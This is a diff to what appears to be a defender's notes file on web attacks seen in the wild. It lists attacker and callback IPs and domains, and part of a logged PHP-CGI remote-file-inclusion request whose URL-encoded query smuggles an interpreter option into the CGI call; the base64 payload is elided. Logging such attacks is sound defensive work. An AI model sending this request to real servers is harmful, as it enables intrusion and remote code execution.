@@ -168,6 +168,7 @@ Notes:
 -Not the first time we've seen this payload, either.
 -Sans ISC reported on this. Wonder if they troll my malware feed :D
 
+
 Pitcher: 89.136.120.205
 Catcher: www.astraltor.de
 NSlookup (Pitcher): NX
@@ -491,6 +492,7 @@ US
 admin@wholesaleinternet.net
 abuse@wholesaleinternet.net
 Notes:
+- Saw this coming from 173.242.119.54 as well (9/12/14)
 
 Returning Champions:
 107.167.11.226
@@ -522,12 +524,12 @@ POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%
 Host: xx.xx.xx.xx
 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 54569
+Content-Length: 54569 (have also seen Content-Length of 77215)
 Connection: close
 <?php
 $bufferf = '<tons of base64 encoding here>
 - The URL encoding is the part of the RFI exploit, where the header/PHP below is the portion that executes a payload, or tells the attacked system where to call back to get the payload.. Any information on this?
-- Also saw 202.51.195.26 Pitching this.
+- Also saw MANY other ips pitching this the week of 9/12/14
 
 Pitcher: 89.248.160.212
 Catcher: 54.209.129.218
